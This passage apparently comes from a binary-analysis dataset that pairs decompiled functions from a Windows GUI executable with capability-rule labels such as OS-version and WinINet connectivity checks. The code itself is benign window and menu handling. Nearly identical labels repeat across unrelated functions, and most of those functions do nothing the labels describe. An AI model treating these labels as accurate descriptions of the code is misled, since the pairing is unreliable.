        "decompiled_code": "\nint32_t * __thiscall fcn.0041ed8f(int32_t *param_1, int32_t param_2, uint param_3, uint *param_4)\n\n{\n    int32_t iVar1;\n    uint *extraout_ECX;\n    uint *extraout_ECX_00;\n    int32_t unaff_retaddr;\n    uint uStack16;\n    \n    if (param_4 == NULL) {\n        fcn.00401280(0x80004005);\n        param_4 = extraout_ECX;\n    }\n    if ((unaff_retaddr == 0) && (param_2 != 0)) {\n        uStack16 = 0x80070057;\n        fcn.00401280();\n        param_4 = extraout_ECX_00;\n    }\n    iVar1 = (***param_4)(param_2, 1);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0040fe20();\n    }\n    *param_1 = iVar1 + 0x10;\n    fcn.0040f8d0(param_2);\n    fcn.0045f3a0(*param_1, param_2, uStack16, param_2);\n    return param_1;\n}\n",
        "token_count": 278
    },
    "0041f6e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0041f6e6(int32_t *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == NULL) {\n        fcn.00411e42();\n    }\n    if ((param_2[1] == 0x201) || (param_2[1] == 0xa1)) {\n        fcn.00430717(*param_2);\n    }\n    iVar1 = fcn.004160df(param_2);\n    if (iVar1 == 0) {\n        if (param_1[0x20] != NULL) {\n            iVar1 = (**(*param_1[0x20] + 0x54))(param_2);\n            if (iVar1 != 0) goto code_r0x0041f71b;\n        }\n        if ((0xff < param_2[1]) && (param_2[1] < 0x10a)) {\n            iVar1 = (**(*param_1 + 0x168))();\n            if (iVar1 != 0) {\n                iVar1 = (*_sym.imp.USER32.dll_TranslateAcceleratorA)(param_1[8], iVar1, param_2);\n                if (iVar1 != 0) goto code_r0x0041f71b;\n            }\n        }\n        uVar2 = 0;\n    }\n    else {\ncode_r0x0041f71b:\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 341
    },
    "0041f821": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041f87d)\n// WARNING: Removing unreachable block (ram,0x0041f889)\n\nvoid fcn.0041f821(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t unaff_EBX;\n    \n    uVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    pcVar2 = _sym.imp.USER32.dll_GetWindow;\n    iVar4 = (*_sym.imp.USER32.dll_GetWindow)(uVar3);\n    pcVar1 = _sym.imp.USER32.dll_ShowWindow;\n    for (; iVar4 != 0; iVar4 = (*pcVar2)(iVar4, 2)) {\n        iVar5 = fcn.004185ec(iVar4);\n        if ((((iVar5 != 0) && (*0x25 != iVar4)) && (iVar6 = fcn.0041f790(*0x25, iVar4),  iVar6 != 0)) &&\n           (((uVar7 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar4, 0xfffffff0),  (uVar7 & 0x18000000) == 0 &&\n             ((*(iVar5 + 0x3c) & 2) != 0)) && (*(unaff_EBX + 0xb4) == 0)))) {\n            (*pcVar1)(iVar4, 4);\n            *(iVar5 + 0x3c) = *(iVar5 + 0x3c) & 0xfffffffd;\n        }\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "0041f9bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041f9bc(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = *(param_1 + 0xb0);\n    if (param_2 != piVar1) {\n        *(param_1 + 0xb0) = 0;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 0x160))(0, param_2, piVar1);\n        }\n        if (((*(param_1 + 0xb0) == 0) && (*(param_1 + 0xb0) = param_2,  param_2 != NULL)) && (param_3 != 0)) {\n            (**(*param_2 + 0x160))(1, param_2, piVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "0041facc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041facc(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (**(*param_1 + 0x15c))();\n    if (iVar1 != 0) {\n        return param_1[0x25];\n    }\n    if ((param_1[0x23] != 0) && (*(param_1[0x23] + 0x94) != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 118
    },
    "0041fd1b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041fd1b(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((arg_10h == 0) && (arg_8h != 0)) {\n        iVar1 = 0;\n    }\n    else {\n        uVar2 = (**0x4b94e8)();\n        iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(uVar2, 0, arg_ch, 0xffffffff, arg_8h, arg_10h);\n        if ((arg_8h != 0) && (arg_10h < iVar1)) {\n            iVar1 = fcn.00401280(0x80004005);\n        }\n        if ((0 < iVar1) && (arg_8h != 0)) {\n            *(arg_8h + -2 + iVar1 * 2) = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 230
    },
    "004203e7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004203e7(uint arg_8h, uint lpIconName)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_58h;\n    uint var_38h;\n    int32_t var_30h;\n    uint var_28h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar1 = fcn.0043026e();\n    iVar1 = (*_sym.imp.USER32.dll_LoadIconA)(*(iVar1 + 0xc), lpIconName);\n    if (iVar1 != 0) {\n        fcn.00462290(&var_58h, 0, 0x30);\n        var_38h = arg_8h;\n        (**(*in_ECX + 100))(&var_58h);\n        if (var_30h != 0) {\n            iVar2 = fcn.0043026e();\n            iVar2 = fcn.004169a4(*(iVar2 + 8), var_30h, &var_28h);\n            if ((iVar2 != 0) && (var_14h != iVar1)) {\n                uVar3 = fcn.0041b694(var_28h, var_10h, var_ch, iVar1);\n                return uVar3;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 320
    },
    "00420531": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420531(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iStack28;\n    int32_t *piStack24;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    if (param_1[0x2d] != NULL) {\n        piStack24 = 0x420546;\n        (*param_1[0x2d])();\n    }\n    piVar2 = (**(*param_1 + 0x13c))();\n    if (piVar2 != NULL) {\n        piStack24 = 0x420561;\n        iVar3 = (**(*piVar2 + 0x8c))();\n        if (iVar3 == 0) {\n            return;\n        }\n    }\n    piStack24 = 0x42056f;\n    iVar3 = fcn.0043026e();\n    piVar4 = *(iVar3 + 4);\n    if ((piVar4 != NULL) && (piVar4[8] == param_1)) {\n        if (piVar2 == NULL) {\n            piStack24 = 0x420589;\n            iVar3 = (**(*piVar4 + 0x94))();\n            if (iVar3 == 0) {\n                return;\n            }\n        }\n        piStack24 = 0x420598;\n        fcn.00425f5e();\n        iStack28 = 0x4205a1;\n        fcn.00425eca();\n        iStack28 = 0x4205a6;\n        iStack28 = fcn.00432e9d();\n        if (iStack28 == 0) {\n            fcn.00432ebd();\n            return;\n        }\n        iStack28 = 0x4205b7;\n        iVar3 = fcn.0043026e();\n        if ((*(iVar3 + 0x14) == '\\0') && (piVar4[8] == 0)) {\n            iStack28 = 0;\n            fcn.00424e30();\n            return;\n        }\n    }\n    if ((piVar2 != NULL) && (piVar2[0x13] != 0)) {\n        piStack24 = 0x4205dd;\n        var_4h = (**(*piVar2 + 0x60))();\n        do {\n            if (var_4h == NULL) {\n                piStack24 = 0x42060b;\n                (**(*piVar2 + 0x7c))();\n                return;\n            }\n            piStack24 = &fcn.00420531::var_4h;\n            iStack28 = 0x4205ef;\n            iVar3 = (**(*piVar2 + 100))();\n            if (iVar3 == 0) {\n                iStack28 = 0x4b62b8;\n                piStack24 = &stack0xfffffffc;\n                fcn.0046230a(&stack0xffffffe4, 0x4a76e8);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            piStack24 = 0x4205fa;\n            piVar4 = fcn.00419143();\n        } while (piVar4 == param_1);\n        iStack28 = 0x42061d;\n        piStack24 = param_1;\n        (**(*piVar2 + 0x94))();\n    }\n    piStack24 = 0x420624;\n    (**(*param_1 + 0x60))();\n    return;\n}\n",
        "token_count": 810
    },
    "004207a5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004207a5(int32_t *arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t *piVar4;\n    int32_t *extraout_ECX;\n    \n    fcn.00418521();\n    uVar1 = fcn.0041be35();\n    piVar2 = in_ECX;\n    if ((uVar1 & 0x40000000) == 0) {\n        piVar2 = fcn.00419182();\n    }\n    piVar4 = NULL;\n    if (piVar2 == NULL) {\n        fcn.00411e42();\n        piVar4 = extraout_ECX;\n    }\n    if (arg_8h != piVar4) {\n        arg_ch = in_ECX;\n    }\n    if (arg_ch != piVar4) {\n        if ((piVar2 == arg_ch) ||\n           ((piVar4 = fcn.00419182(),  piVar2 == piVar4 &&\n            (iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(arg_ch[8], 0x36d, 0x40, 0),  iVar3 != 0)))) {\n            piVar4 = 0x1;\n        }\n        else {\n            piVar4 = NULL;\n        }\n    }\n    piVar2[0xf] = piVar2[0xf] & 0xffffffdf;\n    if (piVar4 != NULL) {\n        piVar2[0xf] = piVar2[0xf] | 0x20;\n    }\n    fcn.0042023e((piVar4 == NULL) * '\\x04' + '\\x04');\n    piVar2 = in_ECX[0x2c];\n    if (piVar2 == NULL) {\n        iVar3 = (**(*in_ECX + 0x140))();\n        piVar2 = *(iVar3 + 0xb0);\n        if (piVar2 == NULL) {\n            return;\n        }\n    }\n    if ((arg_8h != NULL) && (arg_10h == 0)) {\n        (**(*piVar2 + 0x160))(1, piVar2, piVar2);\n    }\n    (**(*piVar2 + 0x164))(arg_8h);\n    return;\n}\n",
        "token_count": 544
    },
    "00420886": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00420886(int32_t param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00419182();\n    if (iVar2 == 0) {\n        iVar2 = fcn.00411e42();\n    }\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    param_2 = param_2 & 0xfff0;\n    if (*(iVar2 + 0x68) == 0) {\ncode_r0x004208cb:\n        fcn.00418521();\n    }\n    else {\n        if (param_2 < 0xf041) {\n            if (((param_2 != 0xf040) && (param_2 != 0xf000)) && (param_2 != 0xf010)) {\n                iVar2 = param_2 - 0xf020;\ncode_r0x004208c4:\n                if ((iVar2 != 0) && (iVar2 != 0x10)) goto code_r0x004208cb;\n            }\n        }\n        else if ((param_2 != 0xf050) && (param_2 != 0xf060)) {\n            iVar2 = param_2 - 0xf120;\n            goto code_r0x004208c4;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x365, 0, (param_2 - 0xf000 >> 4) + 0x1ef00);\n        if (iVar2 == 0) {\n            (*pcVar1)(*(param_1 + 0x20), 0x111, 0xe147, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "00420b1d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420b1d(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    if (arg_8h == NULL) {\n        fcn.00411e42();\n    }\n    piVar1 = fcn.0041fab8();\n    if (arg_10h == 0) {\n        fcn.0041c2a1(0, 0, 0, 0, 0, (-(arg_ch != 0) & 0xffffffc0) + 0x80 | 0x17);\n        (**(*arg_8h + 0x150))(arg_ch);\n        if ((arg_ch != 0) || (iVar2 = fcn.0041facc(),  iVar2 == 0)) {\n            (**(*piVar1 + 0x148))(0);\n        }\n    }\n    else {\n        (**(*arg_8h + 0x150))(arg_ch);\n        piVar1[0x34] = piVar1[0x34] | 0xc;\n    }\n    iVar2 = fcn.0041facc();\n    if (iVar2 == 0) {\n        return;\n    }\n    if (arg_8h[0x23] == NULL) {\n        uVar3 = arg_ch != 0;\n    }\n    else {\n        uVar3 = (**(*arg_8h[0x23] + 0x16c))();\n    }\n    if (uVar3 == 1) {\n        if (arg_ch != 0) {\n            piVar1[0x28] = -1;\n            if (arg_10h == 0) {\n                uVar4 = 8;\n                goto code_r0x00420c04;\n            }\n            piVar1[0x28] = 8;\n            goto code_r0x00420c12;\n        }\n    }\n    else if (uVar3 == 0) {\n        piVar1[0x28] = -1;\n        if (arg_10h != 0) {\n            piVar1[0x28] = 0;\n            return;\n        }\n        uVar4 = 0;\ncode_r0x00420c04:\n        fcn.0041bf7a(uVar4);\n        return;\n    }\n    if (arg_10h != 0) {\n        return;\n    }\ncode_r0x00420c12:\n    (**(*piVar1 + 0x148))(0);\n    return;\n}\n",
        "token_count": 587
    },
    "00420dab": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420dab(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    \n    iVar1 = fcn.00419182();\n    if (iVar1 == 0) {\n        fcn.00411e42();\n    }\n    if ((in_ECX[0x20] != NULL) && (iVar2 = (**(*in_ECX[0x20] + 0x7c))(arg_8h, arg_ch, arg_10h),  iVar2 != 0)) {\n        return;\n    }\n    if (arg_ch == 0xffff) {\n        in_ECX[0xf] = in_ECX[0xf] & 0xffffffbf;\n        if (*(iVar1 + 0x68) == 0) {\n            in_ECX[0x2a] = 0xe001;\n        }\n        else {\n            in_ECX[0x2a] = 0xe002;\n        }\n        (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[8], 0x362, in_ECX[0x2a], 0);\n        iVar1 = (**(*in_ECX + 0x154))();\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_UpdateWindow)(*(iVar1 + 0x20));\n        }\n        goto code_r0x00420e8b;\n    }\n    if ((arg_8h == 0) || ((arg_ch & 0x810) != 0)) {\n        in_ECX[0x2a] = 0;\n    }\n    else {\n        if (arg_8h - 0xf000 < 0x1f0) {\n            arg_8h = (arg_8h - 0xf000 >> 4) + 0xef00;\n        }\n        else if (0xfeff < arg_8h) {\n            in_ECX[0x2a] = 0xef1f;\n            goto code_r0x00420e87;\n        }\n        in_ECX[0x2a] = arg_8h;\n    }\ncode_r0x00420e87:\n    *(iVar1 + 0x3c) = *(iVar1 + 0x3c) | 0x40;\ncode_r0x00420e8b:\n    if (in_ECX[0x2a] != in_ECX[0x2b]) {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(in_ECX[8]);\n        iVar1 = fcn.004185c5(uVar3);\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_PostMessageA)(in_ECX[8], 0x36a, 0, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 651
    },
    "00420f26": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420f26(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        iVar1 = 0;\n    }\n    else {\n        var_4h = *(in_ECX + 0x88);\n        do {\n            if (var_4h == 0) {\n                return 0;\n            }\n            piVar2 = fcn.00416670(&var_4h);\n            iVar1 = *piVar2;\n            uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(iVar1 + 0x20));\n        } while ((uVar3 & 0xffff) != arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 204
    },
    "004214a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004214a0(int32_t *param_1, int32_t param_2)\n\n{\n    fcn.00418521();\n    if (param_2 != 1) {\n        (**(*param_1 + 0x148))(1);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "004216e7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004216e7(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint unaff_ESI;\n    uint uStack8;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uStack8 = 0xc;\n        iVar2 = fcn.00434dfd(param_1 + 0x14, *(param_1 + 0x18));\n        iVar1 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -8 + iVar1 * 0xc;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar3 = *(param_1 + 0x10);\n            *(param_1 + 0x10) = puVar3;\n            puVar3 = puVar3 + -3;\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    if (puVar3 == NULL) {\n        puVar3 = fcn.00411e42();\n    }\n    *(param_1 + 0x10) = *puVar3;\n    puVar3[1] = uStack8;\n    *puVar3 = unaff_ESI;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    return;\n}\n",
        "token_count": 317
    },
    "004217cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004217cb(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x3c) == 0) {\n        uVar1 = fcn.004182f8(\"ImageList_Draw\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x3c) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x3c);\n    return;\n}\n",
        "token_count": 127
    },
    "00421879": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00421879(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "004218af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004218af(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    piVar1 = param_1 + 0x9c;\n    if (*piVar1 == 0) {\n        uVar2 = fcn.004182f8(\"ImageList_GetImageInfo\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        *piVar1 = iVar3;\n    }\n    *param_2 = *piVar1;\n    return;\n}\n",
        "token_count": 140
    },
    "00421958": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00421958(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00421d7a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00421d7a(int32_t *param_1)\n\n{\n    if (1 < *(*param_1 + -4)) {\n        fcn.0040fe30(*(*param_1 + -0xc));\n    }\n    return *param_1;\n}\n",
        "token_count": 65
    },
    "00421e8c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00421e8c(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    uint var_48h;\n    uint var_44h;\n    uint var_2ch;\n    uint var_28h;\n    uint uStack24;\n    uint var_10h;\n    int32_t iStack16;\n    int32_t iStack12;\n    uint var_4h;\n    uint uStack4;\n    \n    uStack4 = 0x3c;\n    var_4h = 0x421e98;\n    fcn.004627af();\n    var_4h = 10;\n    iStack12 = 0x421ea4;\n    fcn.0042167b();\n    *(unaff_EBP + -4) = 0;\n    iStack12 = 10;\n    iStack16 = 0x421eb2;\n    fcn.0042167b();\n    iVar1 = *(extraout_ECX + 0x88);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x10) = iVar1;\n    while (iVar1 != 0) {\n        iStack16 = unaff_EBP + -0x10;\n        var_10h = 0x421ed4;\n        ppiVar3 = fcn.00416670();\n        piVar4 = *ppiVar3;\n        var_10h = 0x421ee0;\n        (**(*piVar4 + 0x15c))();\n        iStack12 = piVar4[8];\n        iStack16 = 0x421ef2;\n        fcn.00421cef();\n        iVar1 = *(unaff_EBP + -0x10);\n    }\n    puVar5 = *(unaff_EBP + -0x44);\n    while( true ) {\n        while( true ) {\n            do {\n                if (puVar5 == NULL) {\n                    puVar5 = *(unaff_EBP + -0x28);\n                    while (puVar5 != NULL) {\n                        iStack12 = puVar5[2];\n                        puVar5 = *puVar5;\n                        var_10h = 0x421f56;\n                        var_10h = fcn.004185ec();\n                        uStack24 = 0x4940a8;\n                        piVar4 = fcn.0042f550();\n                        if (piVar4 != NULL) {\n                            var_10h = 0x421f6e;\n                            (**(*piVar4 + 0x60))();\n                        }\n                    }\n                    *(unaff_EBP + -4) = 0;\n                    *(unaff_EBP + -0x2c) = vtable.CList_struct_HWND_____struct_HWND____.0;\n                    iStack16 = 0x421f86;\n                    fcn.0041fcf0();\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    *(unaff_EBP + -0x48) = vtable.CList_struct_HWND_____struct_HWND____.0;\n                    iStack16 = 0x421f95;\n                    fcn.0041fcf0();\n                    iStack16 = 0x421f9a;\n                    fcn.00462887();\n                    return;\n                }\n                iStack12 = puVar5[2];\n                puVar5 = *puVar5;\n                var_10h = 0x421f09;\n                var_10h = fcn.004185ec();\n                uStack24 = 0x497bf8;\n                piVar4 = fcn.0042f550();\n            } while (piVar4 == NULL);\n            if (piVar4[0x25] != 0) break;\n            var_10h = 0x421f3c;\n            (**(*piVar4 + 0x60))();\n        }\n        var_10h = 0x421f2a;\n        piVar4 = fcn.00419143();\n        if (piVar4 == NULL) break;\n        var_10h = 0x421f35;\n        (**(*piVar4 + 0x60))();\n    }\n    uStack24 = 0x4b62b8;\n    fcn.0046230a(&stack0xffffffe8, 0x4a76e8);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1031
    },
    "00422249": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422249(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piStack16;\n    \n    fcn.00421e8c();\n    if (param_1[0x17] != 0) {\n        iVar4 = param_1[0x17];\n        piStack16 = 0x422264;\n        iVar3 = (*_sym.imp.USER32.dll_GetMenu)();\n        if (iVar3 != iVar4) {\n            piStack16 = param_1[8];\n            (*_sym.imp.USER32.dll_SetMenu)();\n        }\n    }\n    iVar4 = fcn.0043026e();\n    iVar4 = *(iVar4 + 4);\n    if (((iVar4 != 0) && (*(iVar4 + 0x20) == param_1)) && (*(iVar4 + 0x6c) == 0)) {\n        piStack16 = NULL;\n        (*_sym.imp.USER32.dll_WinHelpA)(param_1[8]);\n    }\n    if (param_1[0x13] != NULL) {\n        (**(*param_1[0x13] + 4))();\n    }\n    piVar1 = param_1[0xb];\n    param_1[0x13] = 0;\n    if (piVar1 != NULL) {\n        piStack16 = piVar1;\n        (**(*piVar1 + 0xc))();\n    }\n    if (param_1[10] != NULL) {\n        (**(*param_1[10] + 8))();\n    